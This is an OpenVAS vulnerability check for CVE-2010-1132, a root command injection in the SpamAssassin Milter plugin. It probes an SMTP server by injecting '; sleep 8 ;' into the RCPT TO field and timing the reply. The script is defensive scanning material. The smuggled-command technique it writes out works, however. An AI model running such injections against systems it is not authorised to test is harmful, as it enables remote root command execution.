###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_spamassassin_milter_38578.nasl 8187 2017-12-20 07:30:09Z teissa $
#
# SpamAssassin Milter Plugin 'mlfi_envrcpt()' Remote Arbitrary Command Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "SpamAssassin Milter Plugin is prone to a remote command-
injection vulnerability because it fails to adequately
sanitize user-supplied input data.

Remote attackers can exploit this issue to execute arbitrary shell
commands with root privileges.

SpamAssassin Milter Plugin 0.3.1 is affected; other versions may also
be vulnerable.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100528");
 script_version("$Revision: 8187 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-20 08:30:09 +0100 (Wed, 20 Dec 2017) $");
 script_tag(name:"creation_date", value:"2010-03-15 13:03:19 +0100 (Mon, 15 Mar 2010)");
 script_cve_id("CVE-2010-1132");
 script_bugtraq_id(38578);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

 script_name("SpamAssassin Milter Plugin 'mlfi_envrcpt()' Remote Arbitrary Command Injection Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38578");
 script_xref(name : "URL" , value : "http://savannah.nongnu.org/projects/spamass-milt/");
 script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2010/Mar/140");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("SMTP problems");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
 script_require_ports("Services/smtp", 25);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("smtp_func.inc");

if(get_kb_item("SMTP/qmail"))exit(0);

port = get_kb_item("Services/smtp");
if(!port) port = 25;

if(get_kb_item('SMTP/'+port+'/broken'))exit(0);
if(!get_port_state(port))exit(0);

banner = get_smtp_banner(port:port);
if(!banner)exit(0);

dom = eregmatch(pattern: "220 ([^ ]+)", string: banner);
if(isnull(dom[1])) {
  domain = get_host_name();
} else {
  domain = dom[1];
}  

soc = smtp_open(port: port, helo: NULL);
if(!soc)exit(0);
 
src_name = this_host_name();
FROM = string('openvas@', src_name);
TO = string('openvas@', domain);

send(socket: soc, data: strcat('HELO ', src_name, '\r\n'));
buf = smtp_recv_line(socket: soc);

if(buf !~ "^250") { 
  smtp_close(socket: soc); 
  exit(0);
}  

start1= unixtime();
send(socket: soc, data: strcat('MAIL FROM: ', FROM, '\r\n'));
buf = smtp_recv_line(socket: soc);
stop1 = unixtime();

dur1 = stop1-start1;

if(buf !~ "^250") {
  smtp_close(socket: soc);
  exit(0);
}

start2= unixtime();
send(socket: soc, data: string('RCPT TO: root+:"; sleep 8 ;"\r\n'));
buf = smtp_recv_line(socket: soc);
stop2 = unixtime();
dur2 = stop2-start2;

if(!isnull(buf) && buf =~ "^250" && (dur2 > dur1 && dur2 > 7 && dur2 < 12)) {
  smtp_close(socket: soc);
  security_message(port:port);
  exit(0);
}

smtp_close(socket: soc);

exit(0);
  
